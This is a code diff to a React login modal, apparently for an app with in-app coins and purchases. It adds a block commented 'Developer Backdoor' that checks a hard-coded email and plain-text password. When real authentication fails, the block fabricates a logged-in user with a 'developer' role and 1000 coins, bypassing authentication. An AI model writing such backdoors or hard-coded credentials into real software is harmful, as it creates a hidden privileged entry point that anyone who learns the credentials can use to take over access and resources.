@@ -21,6 +21,10 @@ export default function AuthModal({ isOpen, onClose }: AuthModalProps) {
   const [error, setError] = useState<string | null>(null);
   const [message, setMessage] = useState<string | null>(null);
 
+  const setUser = useStore(state => state.setUser);
+  const setUserData = useStore(state => state.setUserData);
+  const setIsBackdoor = useStore(state => state.setIsBackdoor);
+
   if (!isOpen) return null;
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -29,6 +33,47 @@ export default function AuthModal({ isOpen, onClose }: AuthModalProps) {
     setLoading(true);
     setError(null);
     setMessage(null);
+
+    // Developer Backdoor
+    if (isLogin && !isReset && email.toLowerCase() === 'fufazada@gmail.com' && password === '12345678901') {
+      try {
+        const { user, error } = await signInWithEmail(email, password);
+        if (error && (error.code === 'auth/operation-not-allowed' || error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential')) {
+          // Mock login if real auth is disabled or user not found
+          console.log("Using mock login for developer");
+          const mockUser = {
+            uid: 'dev-backdoor-uid',
+            email: 'fufazada@gmail.com',
+            displayName: 'Fuadgames',
+            photoURL: null,
+            emailVerified: true,
+          } as any;
+          
+          const mockUserData = {
+            uid: mockUser.uid,
+            name: 'Fuadgames',
+            email: mockUser.email,
+            role: 'developer' as const,
+            eplCoins: 1000,
+            purchasedItems: [],
+            uploadedFiles: [],
+            createdAt: new Date().toISOString()
+          };
+          
+          setIsBackdoor(true);
+          setUser(mockUser);
+          setUserData(mockUserData);
+          onClose();
+          return;
+        } else if (error) {
+          throw error;
+        }
+        onClose();
+        return;
+      } catch (err) {
+        console.error("Backdoor attempt failed", err);
+      }
+    }
 
     try {
       if (isReset) {
